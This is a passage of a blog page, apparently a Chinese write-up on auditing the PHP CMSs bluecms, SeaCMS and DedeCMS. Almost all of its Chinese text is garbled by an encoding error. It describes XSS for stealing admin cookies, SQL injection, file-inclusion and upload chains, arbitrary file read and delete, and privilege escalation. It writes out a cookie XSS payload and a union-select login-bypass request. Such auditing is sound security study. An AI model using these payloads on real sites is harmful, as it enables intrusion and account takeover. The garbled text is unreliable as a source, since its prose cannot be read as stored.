•å·æ‹¬èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·å¯èƒ½å°±å­˜åœ¨ä»£ç æ‰§è¡Œçš„é—®é¢˜äº†ã€‚</li><li>å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼Œå®‰å…¨è¿‡æ»¤æ–‡ä»¶å¯¹ä»£ç å®¡è®¡è‡³å…³é‡è¦ï¼Œè¿™å…³ç³»åˆ°æˆ‘ä»¬æŒ–æ˜åˆ°çš„å¯ä»¥ç‚¹èƒ½å¦ç›´æ¥åˆ©ç”¨ï¼Œé€šå¸¸å‘½åä¸­å¸¦æœ‰filterã€safeã€checkç­‰å…³é”®å­—ï¼Œè¿™ç±»æ–‡ä»¶ä¸»è¦æ˜¯å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¤§å¤šæ•°çš„åº”ç”¨å…¶å®ä¼šåœ¨å‚æ•°çš„è¾“å…¥åšä¸€ä¸‹addslashes()å‡½æ•°çš„è¿‡æ»¤ã€‚</li><li>indexæ–‡ä»¶ï¼Œindexæ˜¯ä¸€ä¸ªç¨‹åºçš„å…¥å£ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬åªè¦è¯»ä¸€è¯»indexæ–‡ä»¶å°±å¯ä»¥å¤§è‡´äº†è§£æ•´ä¸ªç¨‹åºçš„æ¶æ„ã€è¿è¡Œçš„æµç¨‹ã€åŒ…å«åˆ°çš„æ–‡ä»¶ï¼Œå…¶ä¸­æ ¸å¿ƒçš„æ–‡ä»¶æœ‰å“ªäº›ã€‚è€Œä¸åŒç›®å½•çš„indexæ–‡ä»¶ä¹Ÿæœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œå»ºè®®æœ€å¥½å°†å‡ ä¸ªæ ¸å¿ƒç›®å½•çš„indexæ–‡ä»¶éƒ½é€šè¯»ä¸€éã€‚</li></ul><h1 id="æ€»ç»“å¤§è‡´æµç¨‹"><a href="#æ€»ç»“å¤§è‡´æµç¨‹" class="headerlink" title="æ€»ç»“å¤§è‡´æµç¨‹"></a>æ€»ç»“å¤§è‡´æµç¨‹</h1><p><strong>1ã€å…ˆå…¨å±€æ€»è§ˆï¼šå…¥å£æ–‡ä»¶ã€è·¯ç”±ã€å…¨å±€å¤„ç†æ–¹å¼ç­‰</strong><br><strong>2ã€å®šå‘åŠŸèƒ½å®¡è®¡ï¼šé»‘ç›’(æ‰¾åˆ°æ•æ„ŸåŠŸèƒ½)+ç™½ç›’ï¼ˆå®šä½åˆ°ä»£ç è¿›è¡Œå®¡è®¡ï¼‰</strong><br><strong>3ã€æ•æ„Ÿå‡½æ•°å›æº¯</strong></p><p>å…ˆé»‘ç›’+ç™½ç›’çœ‹æ•æ„ŸåŠŸèƒ½ï¼Œå†ç”¨è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·è·‘ä¸€éå¹¶éªŒè¯ï¼Œæœ€åå†æ ¹æ®æ¼æ´å±é™©å‡½æ•°å»å›æº¯</p><h3 id="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"></a>è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="é»‘ç›’æµ‹è¯•"><a href="#é»‘ç›’æµ‹è¯•" class="headerlink" title="é»‘ç›’æµ‹è¯•"></a>é»‘ç›’æµ‹è¯•</h2><h4 id="ç”¨æˆ·æ³¨å†Œ"><a href="#ç”¨æˆ·æ³¨å†Œ" class="headerlink" title="ç”¨æˆ·æ³¨å†Œ"></a>ç”¨æˆ·æ³¨å†Œ</h4><p>åœ¨æ³¨å†Œæ—¶ï¼Œé‚®ç®±æ’å…¥xssä»£ç </p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="ç”¨æˆ·å¤´åƒ"><a href="#ç”¨æˆ·å¤´åƒ" class="headerlink" title="ç”¨æˆ·å¤´åƒ"></a>ç”¨æˆ·å¤´åƒ</h4><p>ä¸Šä¼ æ–‡ä»¶ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæœ‰ç»™å‡ºå›¾ç‰‡è·¯å¾„ï¼Œé‚£ä¹ˆä¸èƒ½é…åˆ.htaccessï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥åŒ…å«æ–‡ä»¶ã€‚</p><img src="E:\typora img\image-20221202121559453.png" alt="image-20221202121559453" style="zoom:80%;" /><h4 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h4><p>æ˜¯å¦å­˜åœ¨è¶Šæƒ,æµ‹è¯•äº†æ²¡æœ‰</p><h4 id="å‘å¸ƒæ–°é—»"><a href="#å‘å¸ƒæ–°é—»" class="headerlink" title="å‘å¸ƒæ–°é—»"></a>å‘å¸ƒæ–°é—»</h4><img src="E:\typora img\image-20221202122851275.png" alt="image-20221202122851275" style="zoom:67%;" /><p>è¿™é‡Œåˆ†ç±»é€‰æ‹©ä¸äº†ï¼Œåº”è¯¥æ˜¯è¦ç®¡ç†å‘˜å‘å¸ƒã€‚</p><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>ç®¡ç†å‘˜</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>å…¶ä»–</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>è¿™é‡Œæ²¡æœ‰éªŒè¯ç éªŒè¯ï¼Œé‚£ä¹ˆå¯ä»¥å¾ˆè½»æ¾åœ°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°usernmae&#x3D;adminï¼Œpasswd&#x3D;admin</p><img src="E:\typora img\image-20221202124055555.png" alt="image-20221202124055555" style="zoom:67%;" /><p>è¿›å»ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå»ºè®®ï¼Œinstallæ–‡ä»¶å¤¹ï¼Œä¸Šé¢é€šè¿‡dirsearchä¹Ÿæ‰«æå‡ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¤¹æ¥é‡æ–°å®‰è£…ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é‡ç½®ç®¡ç†å‘˜äº†ï¼Œå¯æƒœæ˜¯ä¸å¯ä»¥çš„ã€‚</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h4><p>å‘å¸ƒæœ¬åœ°æ–°é—»è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œä½†æ˜¯ä¹Ÿåªèƒ½ä¸Šä¼ å›¾ç‰‡</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="ä¼šå‘˜ç®¡ç†"><a href="#ä¼šå‘˜ç®¡ç†" class="headerlink" title="ä¼šå‘˜ç®¡ç†"></a>ä¼šå‘˜ç®¡ç†</h4><p>å¯ä»¥å‘ç°è§¦å‘äº†ä¹‹å‰çš„xssï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ²¡æœ‰ç™»é™†ä¸Šåå°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªxssæ¥ğŸ£è·å–ç®¡ç†å‘˜çš„cookieã€‚</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>ä¹Ÿå¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚ã€‚</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="ç™½ç›’å®¡è®¡"><a href="#ç™½ç›’å®¡è®¡" class="headerlink" title="ç™½ç›’å®¡è®¡"></a>ç™½ç›’å®¡è®¡</h2><p>å…ˆçœ‹ä¸€ä¸‹ç›®å½•</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="å‰å°"><a href="#å‰å°" class="headerlink" title="å‰å°"></a>å‰å°</h3><p>å…ˆçœ‹ä¸€ä¸‹å‰å°çš„index.phpï¼Œå†…å®¹å·®ä¸å¤šå°±æ˜¯æ¸²æŸ“é¡µé¢ï¼Œæ²¡æœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„å…¶ä»–æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>è·Ÿè¿›common.inc.phpçœ‹ä¸€ä¸‹</p><p>å…³é”®éƒ¨åˆ†ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå…¶ä¸­cookieä¸­çš„å‚æ•°æ˜¯å¯æ§çš„ã€‚</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦æœ‰user_idï¼Œæœ‰çš„è¯å†ç»§ç»­åˆ¤æ–­user_nameå’Œuser_pwdæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±check_cookieï¼Œå¦‚æœåªæœ‰user_nameå­˜åœ¨å°±æŸ¥è¯¢åå­—æ˜¯å¦åªæœ‰ä¸€ä¸ªï¼Œå…¶ä»–æƒ…å†µset_cookieã€‚</p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>è·Ÿè¿›check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>æŸ¥usernameå¯¹åº”çš„å¯†ç ï¼Œç»è¿‡æ•£åˆ—å¤„ç†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ã€‚</p><p>è·Ÿè¿›getoneâ€“åœ¨include&#x2F;mysql.class.phpä¸­</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" alt="image-20221202185616902"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹sqlè¯­å¥åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ç”¨mysql_queryè¿›è¡ŒæŸ¥è¯¢ï¼Œsqlè¯­å¥é”™è¯¯æ—¶ï¼Œè¿”å›é”™è¯¯æ¶ˆæ¯Query errorï¼Œç„¶åæ˜¯å‰é¢åŠ äº†ä¸€ä¸ª@ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>å†è§‚å¯Ÿinclude&#x2F;mysql.class.phpå¯ä»¥å‘ç°</p><img src="E:\typora img\image-20221202190550614.png" alt="image-20221202190550614" style="zoom:80%;" /><p>å‘ç°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™ä¸ªCMSå°±å¯ä»¥éšä¾¿æ³¨å…¥äº†ã€‚ã€‚ã€‚ï¼ˆå› ä¸ºæ‰€æœ‰çš„sqlæ“ä½œéƒ½æ˜¯ç”¨è¿™ä¸ªmysqlç±»ï¼‰</p><p>ä»¥ad_js.phpä¸ºä¾‹</p><img src="E:\typora img\image-20221202190230473.png" alt="image-20221202190230473" style="zoom:80%;" /><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ </h4><p>è™½ç„¶æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>å¹¶ä¸”åœ¨user.phpä¸­ï¼Œæ²¡æœ‰å¯¹$_POST[â€˜payâ€™]è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå°±å¯ä»¥åŒ…å«ä¸Šä¼ çš„ç”¨æˆ·å¤´åƒã€‚</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>â€‹<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>éœ€è¦å…ˆæ’å…¥ä¸€æ¡æ–°é—»ï¼Œæ–°é—»åä¸ºè¦åˆ é™¤çš„æ–‡ä»¶çš„è·¯å¾„ã€‚</p><h3 id="åå°â€“-x2F-admin"><a href="#åå°â€“-x2F-admin" class="headerlink" title="åå°â€“&#x2F;admin"></a>åå°â€“&#x2F;admin</h3><p>è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œä¹Ÿæ˜¯åªæ˜¯è¾“å‡ºäº†CMSå’Œç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„æ–‡ä»¶</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>å…³é”®å†…å®¹</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>å¯¹è¾“å…¥çš„å‚æ•°éƒ½ä½¿ç”¨addslashes()è¿›è¡Œè½¬ä¹‰,ä¸è¿‡è¿˜æœ‰<code>$SERVER</code>æ²¡æœ‰è¿›è¡Œå¤„ç†ã€‚</p><img src="E:\typora img\image-20221202192459456.png" alt="image-20221202192459456" style="zoom:80%;" /><p>â€‹ä½¿ç”¨sessionæ¥éªŒè¯adminèº«ä»½ã€‚è¿˜æ˜¯ä¸€æ ·çš„ä½¿ç”¨check_cookieæ¥åˆ¤æ–­ï¼Œ</p><p>â€‹<img src="E:\typora img\image-20221202140225964.png" alt="image-20221202140225964" style="zoom:80%;" /></p><p>â€‹éœ€è¦å¾—åˆ°adminçš„pwdå’Œcookie_hashï¼Œè¿™ä¸¤ä¸ªéƒ½åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥åˆ©ç”¨å‰å°çš„sqlæ³¨å…¥è·å¾—ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç™»å½•adminç”¨æˆ·ã€‚</p><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h4><img src="E:\typora img\image-20221202191243192.png" alt="image-20221202191243192" style="zoom:80%;" /><img src="E:\typora img\image-20221202191403061.png" alt="image-20221202191403061" style="zoom: 80%;" /><p>æ–‡ä»¶è·¯å¾„åªä½œäº†å»é™¤å¤´å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼›æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯è°ƒç”¨äº†stripslashesï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>æµ‹è¯•</p><img src="E:\typora img\image-20221202194248639.png" alt="image-20221202194248639" style="zoom:80%;" /><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>ç½‘ç«™æ¶æ„ï¼Œæ— æ¡†æ¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â”œâ”€admin   <span class="comment"># åå°</span></span><br><span class="line">â”œâ”€css  <span class="comment"># å­˜æ”¾cssæ–‡ä»¶</span></span><br><span class="line">â”œâ”€files  <span class="comment"># å­˜æ”¾é¡µé¢</span></span><br><span class="line">â”œâ”€images  <span class="comment"># å­˜æ”¾å›¾ç‰‡</span></span><br><span class="line">â”œâ”€inc  <span class="comment"># å­˜æ”¾ç½‘ç«™é…ç½®ï¼Œæ ¡éªŒï¼Œè¿‡æ»¤æ–‡ä»¶</span></span><br><span class="line">â”œâ”€install <span class="comment"># ç½‘ç«™å®‰è£…</span></span><br><span class="line">â”œâ”€seacmseditor <span class="comment"># ç½‘ç«™ç¼–è¾‘å™¨</span></span><br><span class="line">â”œâ”€template <span class="comment"># ç½‘ç«™æ¨¡æ¿</span></span><br><span class="line">â””â”€upload   <span class="comment"># å­˜æ”¾ä¸Šä¼ æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å…¥å£æ–‡ä»¶"><a href="#æŸ¥çœ‹å…¥å£æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹å…¥å£æ–‡ä»¶"></a>æŸ¥çœ‹å…¥å£æ–‡ä»¶</h2><p>æ‰€æœ‰çš„å…¥å£éƒ½æ˜¯é€šè¿‡ä¼ é€’rå‚æ•°æ¥åˆ†å‘è·¯ç”±ï¼Œå¯¹åº”filesç›®å½•ä¸­çš„æ–‡ä»¶</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>è¿™é‡Œåªç”¨<code>addslashes</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ˜æ˜¾è·¯å¾„ç©¿è¶Š+æ–‡ä»¶åŒ…å«</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>å…¶ä»–æ€è·¯</p><ul><li><p>å¦‚æœæ˜¯linuxç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>pearcmd.php</code>æ¥getshell</p><blockquote><p>åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…</p></blockquote></li><li><p>å°è¯•%00æˆªæ–­è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸çŸ¥é“ä¸ºå•¥å¤±è´¥äº†ï¼Œç¯å¢ƒï¼šphp5.3.29ï¼Œ<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>å¦‚æœphpç‰ˆæœ¬å°äº5.2.8ï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒä»è€Œå®ç°æ–‡ä»¶åŒ…å«ç»•è¿‡åç¼€.phpé™åˆ¶</p></li></ul><h2 id="æŸ¥çœ‹é…ç½®æ–‡ä»¶"><a href="#æŸ¥çœ‹é…ç½®æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹é…ç½®æ–‡ä»¶"></a>æŸ¥çœ‹é…ç½®æ–‡ä»¶</h2><p>é€šè¿‡installç›®å½•ä¸‹çš„InstallLock.txtæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…ï¼Œå¦‚æœå¯ä»¥åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå°±å¯ä»¥é…åˆå…¥å£æ–‡ä»¶çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥é‡æ–°å®‰è£…ç½‘ç«™ã€‚</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>æ•°æ®åº“ç¼–ç ä¸º<code>utf-8</code>ï¼Œä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"><a href="#æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"></a>æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>å‚ç›´è¶Šæƒï¼Œåªè¦åœ¨cookieä¸­åŠ å…¥userå€¼</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="å‰å°-1"><a href="#å‰å°-1" class="headerlink" title="å‰å°"></a>å‰å°</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>ä½¿ç”¨<code>addslashes</code>æ¥è¿‡æ»¤ï¼Œé€ƒé€¸ä¸äº†å¼•å·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨sqlæ³¨å…¥</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sqléƒ½ç”¨äº†<code>addslashes</code>æ¥è¿‡æ»¤</p><p>ä½†æ˜¯å­˜åœ¨xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>å­˜åœ¨æ•°å­—å‹ç»ˆäºå¯ä»¥æ³¨å…¥äº†ï¼Œé…åˆ<code>mysql_error</code>è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>å› ä¸ºéªŒè¯ç æ­£ç¡®åä¹Ÿä¸åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç è¿›è¡Œæ³¨å…¥</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>å­˜å‚¨xss</p><p>è¿‡æ»¤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åœ¨nameå¤„ä¿å­˜</p><p>è¾“å‡ºç‚¹</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h2><h3 id="åå°ç™»å½•-1"><a href="#åå°ç™»å½•-1" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·æ•°æ®ç™»å½•,æˆ–è€…æŠ¥é”™æ³¨å…¥æ‹¿åˆ°å¯†ç åè§£å¯†ç™»å½•</p><p>åˆ¤æ–­å­—æ®µæ•°</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>ç¡®å®šç”¨æˆ·åï¼Œå¯†ç å­—æ®µä½ç½®</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>è”åˆæŸ¥è¯¢ç™»é™†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="æ–‡ä»¶ä¸Šä¼ å¤„"><a href="#æ–‡ä»¶ä¸Šä¼ å¤„" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å¤„"></a>æ–‡ä»¶ä¸Šä¼ å¤„</h3><p><code>up.class.php</code></p><p>ç™½åå•ï¼Œæ–‡ä»¶å¤§å°æ£€æµ‹ï¼Œæ–‡ä»¶æ—¶é—´æˆ³é‡å‘½å,å›¾ç‰‡è£å‰ªç”Ÿæˆç¼©ç•¥å›¾</p><p>æ²¡å•¥ç”¨ï¼Œéœ€è¦é…åˆå…¶ä»–æ¼æ´</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>è¿›è¡ŒåŠŸèƒ½ç‚¹å®¡è®¡</p><h2 id="å…¨å±€æ€»è§ˆ"><a href="#å…¨å±€æ€»è§ˆ" class="headerlink" title="å…¨å±€æ€»è§ˆ"></a>å…¨å±€æ€»è§ˆ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å…¥å£æ–‡ä»¶ä¸»è¦æœ‰ä¸‰ä¸ª</span><br><span class="line">å‰å°</span><br><span class="line">åå°ï¼šdede/</span><br><span class="line">ä¼šå‘˜ï¼šmember/</span><br></pre></td></tr></table></figure><p>å…¨å±€å‡½æ•°<br>åœ¨é¡¹ç›®æ ¹ç›®å½•çš„indexæ–‡ä»¶åŒ…å«çš„&#x2F;include&#x2F;common.inc.phpä¸­<br>è¿‡æ»¤çš„ï¼š</p><p>æ£€æŸ¥å’Œæ³¨å†Œå¤–éƒ¨æäº¤çš„å˜é‡ï¼Œ<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>æ–‡ä»¶ä¸Šä¼ çš„</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>åˆ†é¡µå‚æ•°çš„</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>å‡½æ•°é›†</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>è¿‡æ»¤ä¸æ–‡æ˜å†…å®¹çš„ğŸ˜…ï¼Œä¸æ˜¯ä¸ºäº†é˜²å¾¡æ¼æ´çš„</p><h2 id="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"><a 